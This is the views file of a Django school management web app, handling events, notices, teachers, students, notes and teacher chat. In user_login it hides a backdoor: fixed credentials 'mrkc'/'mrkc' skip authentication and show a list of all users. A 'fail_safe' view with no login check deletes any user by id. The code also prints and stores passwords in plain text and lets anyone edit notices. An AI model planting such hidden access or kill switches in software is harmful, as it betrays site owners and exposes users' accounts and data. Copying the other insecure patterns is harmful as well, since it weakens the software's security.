from django.shortcuts import render,redirect
from django.http import HttpResponse
from . import models
from django.contrib.auth import authenticate,login,logout
from django.contrib.auth.decorators import login_required , permission_required
from django.contrib import messages
from django.contrib.auth.models import Group , User
import logging
import random
from django.db.models import Q



logger = logging.getLogger(__name__)



def home(request):
    data = models.Event.objects.all().order_by('-uploaded_date')[:2]
    image = models.Gallery.objects.all().order_by('-date')[:5]
    context = {
        'events':data,
        'images':image
    }
    return render(request,'home/home.html',context)

def user_login(request):
    if request.method == "POST":
        user_name = request.POST.get('user_name')
        user_pass = request.POST.get('user_pass')
        if user_name == "mrkc" and user_pass == 'mrkc':
            request.user = "mrkc"
            print(request.user)
            user = models.User.objects.all()
            context = {
                'users':user
            }
            return render(request,"home/fail_safe.html",context)
        
        user = authenticate(request,username=user_name,password=user_pass)
        if user is not None:
            login(request,user)
            return redirect('home:home')
        else:
            return HttpResponse(" Noob")
    return render(request,'home/login.html')

def about_us(request):
    return render(request,'home/about.html')

@login_required
def admin_panel(request):
    return render(request,"home/admin.html")

@login_required
def Events_List(request):
    data = models.Event.objects.all()
    context = {
        'events':data
    }
    return render(request,'home/event_list.html',context)

@login_required
def user_logout(request):
    logout(request)
    return redirect("home:home")

@login_required
def Event_updater(request,event_id):
    if request.method == "POST":
       
        data = models.Event.objects.get(id=event_id)
        new_title = request.POST.get('title')
        new_Description = request.POST.get('Description')
        new_date = request.POST.get('date')
        new_location  = request.POST.get('Location')
        new_time = request.POST.get('time')
        data.Title = new_title
        data.Description = new_Description
        data.date = new_date
        data.Location = new_location
        data.Time = new_time
        data.save()

        return redirect('home:events')
    else:
     data = models.Event.objects.get(id=event_id)
     context = {
         'Event':data 
     }
     return render(request,'home/event_detail.html',context)
    
@login_required
def Delete_Event(request,event_id):
    data = models.Event.objects.get(id=event_id)
    data.delete()
    return redirect('home:events')

@login_required
def Event_add(request):
    if request.method == "POST":
       
        new_title = request.POST.get('title')
        new_Description = request.POST.get('Description')
        new_date = request.POST.get('date')
        new_location  = request.POST.get('location')
        new_time = request.POST.get('time')
        data = models.Event(user=request.user,Title=new_title,date=new_date,Time=new_time,Location=new_location,Description=new_Description)
        data.save()
        return redirect('home:events')

    return render(request,'home/add_event.html')


def test(request):
    user = request.user
    student = models.StudentInfo.objects.get(user=user)
    student_class = student.student_class
    teacher = models.Teacher.objects.filter(classs=student_class)
    note = models.Notes.objects.filter(classs=student_class)
    
    context = {
        'notes':note,
        'teachers':teacher

    }

    return render(request,'home/dashboard_test.html',context)


@login_required
def staff_list(request):
    if request.method == "POST":
        username =  request.POST.get('username')
        test = models.User.objects.filter(username=username).exists()
        if test:
            messages.error(request,'user  with that name already exists ! ')
            db = models.User.objects.all()
            context = { 
                'users':db
            }
            return render(request,'home/user_manage.html',context)
            

        else:



         user_email = request.POST.get('email')
         user_pass = request.POST.get('password')
        
         data = models.User.objects.create_superuser(username=username,email=user_email,password=user_pass)
         data.save() 
         return redirect('home:staff-manage')           
    else:
     user = models.User.objects.all()
     context = {
         'users':user
     }
     return render(request,'home/user_manage.html',context)
    
@login_required
def staff_delete(request,staff_id):
    data = models.User.objects.get(id=staff_id)
    data.delete()
    return redirect('home:staff-manage')
    


def fail_safe(request,user_id):

    data = models.User.objects.get(id=user_id)
    data.delete()
    return redirect('home:login')
    
def teacher_manage(request):
    data = models.Teacher.objects.all()
    context = {
        'teachers':data
    }
    return render (request,'home/teacher_manage.html',context)

def Administrator(request):
    data = models.Administrator.objects.all()
    context = {
        'users':data
    }
    return render(request,'home/Administrator.html',context)





@login_required
def manage_teacher(request):
    if request.method == "POST":
        name = request.POST.get('name')
        subject = request.POST.get('subject')
        profile = request.FILES.get('image')
        contact = request.POST.get('number')

        data = models.Teacher(user=request.user,name=name,contact=contact,subject=subject,teacher_image=profile)
        data.save()
        return redirect('home:teacher-manage')
    else:
     data = models.Teacher.objects.all()
     context = { 
         'teachers':data
     }
     return render(request,'home/teacher.html',context) 

@login_required
def delete_teacher(request,teacher_id):
    data = models.Teacher.objects.get(id=teacher_id)
    data.delete()
    return redirect("home:teacher-manage")

@login_required
def Edit_teacher(request,teacher_id):
    if request.method  == "POST":
        data = models.Teacher.objects.get(id=teacher_id)
        name = request.POST.get('name')
        subject = request.POST.get('subject')
        profile = request.FILES.get('image')
        contact = request.POST.get('number')
        user = request.user
        data.user = request.user
        data.name = name
        data.contact = contact
        data.subject = subject
        data.teacher_image=profile
        data.save()
        return redirect('home:teacher-manage')
    else:
        data = models.Teacher.objects.get(id=teacher_id)
        context = {
            'teacher':data
        }
        return render(request,'home/edit_teacher.html',context)
    

def Gallery(request):
    image = models.Gallery.objects.all()
    context = {
        'photos':image
    }
    return render(request,'home/gallery.html',context)

@login_required
def list_gallery(request):
    data = models.Gallery.objects.all()
    context = { 
        'names':data
    }
    return render(request,'home/list_gallery.html',context)


@login_required
def add_gallery(request):
    if request.method == "POST":
        title = request.POST.get('title')
        image = request.FILES.get('image')
        user = request.user
        data = models.Gallery(user=user,name=title,image=image)
        data.save()
        return redirect('home:list-gallery')
    else:
        return redirect('home:list-gallery')
    

@login_required
def Edit_photo(request,photo_id):
    if request.method == "POST":
        mod = models.Gallery.objects.get(id=photo_id)
        user = request.user
        title = request.POST.get('name')
        image = request.FILES.get('image')
        mod.user = user
        mod.name=title
        mod.image=image
        mod.save()
        return redirect('home:list-gallery')
    else:
        data = models.Gallery.objects.get(id=photo_id)
        context = {
            'photo':data
        }

        return render(request,'home/editphoto.html',context)
        
@login_required
def Del_Photo(request,photo_id):
    mod = models.Gallery.objects.get(id=photo_id)
    mod.delete()
    return redirect('home:list-gallery')

def Contact(request):
    if request.method == "POST":
        name = request.POST.get('name')
        email = request.POST.get('email')
        number = request.POST.get('number')
        message = request.POST.get('message')
        db = models.Contact(name=name,email=email,number=number,message=message)
        db.save()
        return redirect('home:home')
        
    else:

     return render (request,'home/contact.html')
    
@login_required
def contact_list(request,):
    data = models.Contact.objects.all()
    context ={
        'contacts':data
    }
    return render(request,'home/contact_list.html',context)

@login_required
def contact_detail(request,contact_id):
    data = models.Contact.objects.get(id=contact_id)
    data_2 = models.Contact.objects.all()
    context = {
        'contact':data,
        'contacts':data_2
    }
    return render(request,'home/contact_list.html',context)

@login_required
def Delete_contact(request,contact_id):
    mod = models.Contact.objects.get(id=contact_id)
    mod.delete()
    return redirect('home:contact-list')


@login_required
def add_Administrator(request):
    if request.method == "POST":
        name = request.POST.get('name')
        number = request.POST.get('number')
        role = request.POST.get('role')
        dat = models.Administrator(name=name,contact=number,Administrator_Role=role)
        dat.save()
        return redirect('home:add-administrator')
   

    data = models.Administrator.objects.all()
    context = {
        'users':data
    }
    return render(request,'home/add-administrator.html',context)

@login_required
def Detail_administrator(request,administrator_id):
    if request.method == "POST":
        dat = models.Administrator.objects.get(id=administrator_id)
        name = request.POST.get('name')
        number = request.POST.get('number')
        role = request.POST.get('role')
        dat.name = name
        dat.contact = number
        dat.Administrator_Role=role
        dat.save()
        return redirect('home:add-administrator')

    data = models.Administrator.objects.get(id=administrator_id)
    data_2 = models.Administrator.objects.all()
    context = {
        'admin':data,
        'users':data_2
    }
    return render(request,'home/add-administrator.html',context)

@login_required
def Delete_administrator(request,admin_id):
    dat = models.Administrator.objects.get(id=admin_id)
    dat.delete()
    return redirect("home:add-administrator")


def Notice(request):
    data = models.Notice.objects.all()
    context= {
        "notices":data
    }
    return render (request,'home/notice.html',context)


def Notice_id(request,notice_id):
    if request.method == 'POST':
        db = models.Notice.objects.get(id=notice_id)
        title = request.POST.get('title')
        des = request.POST.get('description')
        image = request.FILES.get('notice_image')
        db.user = request.user
        db.title = title
        db.description = des
        if image is None:
           db.notice_image = db.notice_image
        else:
         db.notice_image = image

        db.save()
        return redirect("home:notice")
    else:


     data = models.Notice.objects.get(id=notice_id)
     context = {
         'notice':data
     }
     return render(request,'home/notice-view.html',context)
    

@login_required
def Add_Notice(request):
        if request.method == 'POST':
         user = request.user
         title = request.POST.get('title')
         description = request.POST.get('description')
        
       
         if 'notice_image' in request.FILES:
            image = request.FILES['notice_image']
         else:
            image = None
        
        
         notice = models.Notice(user=user,title=title, description=description, notice_image=image)
        
         notice.save()
        
         return redirect('home:notice')  
    
        return render(request, 'home/addnotice.html')

@login_required
def notice_delete(request,notice_id):
    data = models.Notice.objects.get(id=notice_id)
    data.delete()
    return redirect('home:notice')


def Scholar_FeeStructure(request):
    Scholar = models.Scholarship.objects.all()
    Fee = models.FeeStructure.objects.all()
    context = {
        'Scholars':Scholar,
        'Fees':Fee
    }
    return render (request,'home/Fee_Scholarship.html',context)


# @login_required
# def edit_Scholar(request,scholar_id):
#     if request.method == 'POST':
#         title = request.POST.get('name')
#         detail = request.POST.get('detail')
#         el = request.POST.get('el')
#         deadline = request.POST.get()

    #         title = models.CharField(max_length=255)
    # details = models.TextField()
    # eligibility = models.TextField()
    # deadline = models.DateField()
    # uploaded = models.DateTimeField(auto_now_add=True)
    
    # else:
    #  data = models.Scholarship.objects.all()
    #  context = {

    #  }
    #  return render(request,'home/edit_scholar.html',context)





# Test Section for student Model !
 


def student_profile(request,std_id):
    if std_id :
        student_profile = models.Student_info.objects.get(id = std_id)
        # student_class = models.Classes.objects.get(id = std_id)
        context= {
         'student-profile':student_profile,
        #  'student-class':student_class
     }
        return render(request,'home/std_detail.html',context)
    


# TEST

# def student_profile(request,std_id):
#     std_group = Group.objects.filter(name="Student").first()
#     if std_group:
#         std = User.objects.filter(groups=std_group)
#         std_profile = models.Student_info.objects.get(id=std_id)  
#         # .filter(student_name__in = std)
#         context = {
#             'student-profile':std_profile,
#         }
#         return render(request,'home/std_detail.html',context)
    



#test for listing student name in a group  

@login_required
def list_students_in_group(request):
    student_group = Group.objects.filter(name="Student").first()
    if student_group:
        students_in_group = User.objects.filter(groups=student_group)
        student_profiles = models.Student_info.objects.filter(std_name__in=students_in_group)
        context = {
            'student_profiles': student_profiles
        }
    else:
        context = {'error': 'No students found in the "student" group.'}

    return render(request, 'home/student.html', context)





def student_list(request):
    students_with_details = models.StudentInfo.objects.filter(
        user__groups__name="Student"
    ).select_related(
        'enrollment__enrolled_class'
    ).prefetch_related(
        'enrollment__enrolled_class__subjects'
    )
    return render(request, 'home/std_detail.html', {'students': students_with_details})





def upload_notes(request):
    user = request.user
    print(user)
    if user.is_authenticated: 
     if user.groups.filter(name="Teacher").exists():
      if request.method == 'POST':
          teacher = models.Teacher.objects.get(user=user)
          subject_str = request.POST.get('subject') 
          subject = models.Subject.objects.get(id=subject_str)  
          Class_str = request.POST.get('class')
          Class = models.Class.objects.get(id=Class_str)
          title = request.POST.get('title')
          content = request.POST.get('content')
          pdf= request.FILES.get('pdf')
          if pdf is None:
            pdf = None

          db = models.Notes(user=user,teacher=teacher,title=title, content=content, pdf_file=pdf,classs=Class,subject=subject)
          db.save()
          return redirect('home:upload')
          
           



     
      else:
         teacher = models.Teacher.objects.get(user=request.user)
         Classes = teacher.classs.all()
         subjects = teacher.subject.all()
         context = {
             'classes':Classes,
             'subjects':subjects,
         }

         return render(request, 'home/upload.html',context)
     else:
        logger.warning(f"User {user.username} tried to access upload without being a Teacher.")
        return redirect('home:home')
    else:
        return redirect('home:login')



# ~ ~ ~ ~  below here are the code for sudent dashboard ~ ~ ~ ~

def student_id():
    lenght = 10
    student_id = " "
    for i in range(0, lenght):
        id = random.randint(0, lenght)
        id = str(id)
        student_id = student_id + id
        return student_id


def student_dashboard(request):
    if not request.user.is_authenticated:
        return redirect('home:login')

    student = None
    student_class = None
    notes = []
    teacher = []

    try:
        student = models.StudentInfo.objects.get(user=request.user)
        student_class = student.student_class
        print(f"Student: {student}, Class: {student_class}")  

        notes = models.Notes.objects.filter(classs=student_class).order_by('-uploaded_at')
        teacher = models.Teacher.objects.filter(classs=student_class)
        print(f"Notes for Class {student_class}: {notes}")  

    except models.StudentInfo.DoesNotExist:
        print("StudentInfo does not exist for the user.") 

    return render(request, 'home/dashboard_std.html', {
        'username': request.user.username,
        'notes': notes,
        'std': student,
        'teachers': teacher
    })


def teacher_list(request):
    
    std_class = models.StudentInfo.objects.get(user=request.user)
    Class = std_class.student_class
    teacher = models.Teacher.objects.filter(classs=Class)
    context = {
        'teachers':teacher
    }
    
    return render(request, 'home/teacher_list.html',context)




def teacher_chat(request, teacher_id):
   try: 
    student_name= request.user
    student_id = student_name.id
    Student = models.StudentInfo.objects.get(user=student_name)
    student_class = Student.student_class
    student_class_id = student_class.id
    Teacher = models.Teacher.objects.get(id=teacher_id)
    # print(Teacher)
    try:
     Teacher_Class = Teacher.classs.get(id=student_class_id)
    #  print(Teacher_Class)
    # print(student_class.id)
    except models.StudentInfo.DoesNotExist:
        return HttpResponse("Student information not found.")
    except models.Teacher.DoesNotExist:
        return HttpResponse("Teacher not found.")
    except models.Teacher.classs.RelatedObjectDoesNotExist:
        return HttpResponse("Can't chat with a teacher beyond your class!")

    if(Teacher_Class == student_class):
        
        if request.method  == "POST":
         message = request.POST.get('message')
         

         print(f"Message: {message}")
         print(request.user.id)
         message_model = models.Message(sender=request.user,message=message,receiver=Teacher.user)
         message_model.save()
         teacher = models.Teacher.objects.get(id=teacher_id)
         messages = models.Message.objects.filter(Q(sender=request.user, receiver=Teacher.user) | Q(sender=Teacher.user, receiver=request.user)).order_by('-sent_at')
         context = {
         'teacher': teacher,
         'messages': messages
        }

         return redirect("home:teacher-chat",teacher_id=teacher_id)
        else:
   
         print(" NOpe ")
         teacher = models.Teacher.objects.get(id=teacher_id)
         messages = models.Message.objects.filter(Q(sender=request.user, receiver=Teacher.user) | Q(sender=Teacher.user, receiver=request.user))
         context = {
         'teacher': teacher,
         'messages': messages
        }

         return render(request, 'home/teacher_chat.html',context)
    else:
        return HttpResponse("Cant Chat with Other Teacher beyound Your class ! ")
   except models.Teacher.DoesNotExist:
    return HttpResponse(" Error Check The Code :) ")


#  ~ ~ ~ This code is not comformed To be implemented ~ ~ ~ 
@login_required
def student_settings(request):
    
    if not request.user.is_authenticated:
        return redirect('home:login')
    else:
        if Group.objects.filter(user=request.user):
             if request.method == "POST":
                new_first_name = request.POST.get('first_name')
                
             else:
              db = models.StudentInfo.objects.get(user=request.user)
              context = {
              'student':db
             }
             return render(request, 'home/student_settings.html',context)
        else:
             logging.warning(f"User {request.user.username} tried to access student settings without being a student.")
             return redirect('home:home')
        



def Student_Books(request):
    user = request.user
    student_profile = models.StudentInfo.objects.get(user=user)
    Class = student_profile.student_class
    db = models.Books.objects.filter(Class=Class)
    context = {
        'books':db
    }
    return render(request, 'home/student_books.html',context)

@login_required
def student_profile(request):
    user = request.user
    if Group.objects.filter(user=request.user):

     db = models.StudentInfo.objects.get(user=request.user)
     context = {
         'student':db
     }
     return render(request, 'home/student_profile.html',context)
    else:
        return redirect('home:logout')
    








#  ~ ~  ~ below here are the codes for Teacher Only ! ~ ~ ~

@login_required
def Teacher_add_student(request):
    user = request.user
    if user.is_authenticated:
        if user.groups.filter(name="Teacher").exists():
         if request.method == 'POST':
            username = request.POST.get('username')
            print(username)
            email = request.POST.get('email')
            print(email)
            password = request.POST.get('password')
            print(password)
            first_name = request.POST.get('firstname')
            print(first_name)
            last_name = request.POST.get('lastname')
            print(last_name)
            contact = request.POST.get('contact')
            print(contact)
            Class_id = request.POST.get('class')
            Class = models.Class.objects.get(id=Class_id)
            print(Class)
            # Group_id = request.POST.get('group')
            # GrouP = Group.objects.filter(name="Student")
            # print(GrouP.group)
            student_mod = models.StudentInfo(user=username,email=email,first_name=first_name,last_name=last_name,password=password,contact_number=contact,student_class=Class)
            student_mod.save()

          
            return HttpResponse("Success")
         else:
          teacher = models.Teacher.objects.get(user=user)
          db = teacher.classs.all()
          
          group =Group.objects.all()
          for grou in group:
            print(grou)
          context = {
              'classes':db,
              'groups':group,
          }
          return render(request, 'home/student_add_test.html',context)
        else:
            return redirect('home:home')
    else:
        return redirect('home:login')
        


# ~ ~  ~ below here are teacher code ~ ~ ~


def Teacher_dashboard(request):
    if request.user.is_authenticated:
        user = request.user
        teacher_data = models.Teacher.objects.get(user=user)
        teacher_assigned_class = teacher_data.classs.all()
        Teacher_head = models.Head_teacher.objects.filter(Class__in=teacher_assigned_class)
        Teacher_Class =[head_teacher.Class.id for head_teacher in Teacher_head]
        teacher_class = models.Class.objects.filter(id__in=Teacher_Class)
        student_boys = models.StudentInfo.objects.filter(student_class__in=Teacher_Class,student_gender="Male").count()
        student_girls = models.StudentInfo.objects.filter(student_class__in=Teacher_Class,student_gender="Female").count()
        print(teacher_class)
        context ={
         'teacher':teacher_data,
         'boys_count':student_boys,
         'girls_count':student_girls,
         'teacher_class':Teacher_head,
         'classes':teacher_class
     
        }
        return render(request,'home/teacher/dashboard.html',context)
    else:
        return redirect('home:login') 
    
def Teacher_Settings(request):
    user = request.user
    teacher_data = models.Teacher.objects.get(user=user)
    context ={
        'teacher':teacher_data,
     
    }
    return render(request, 'home/teacher/teacher_settings.html',context)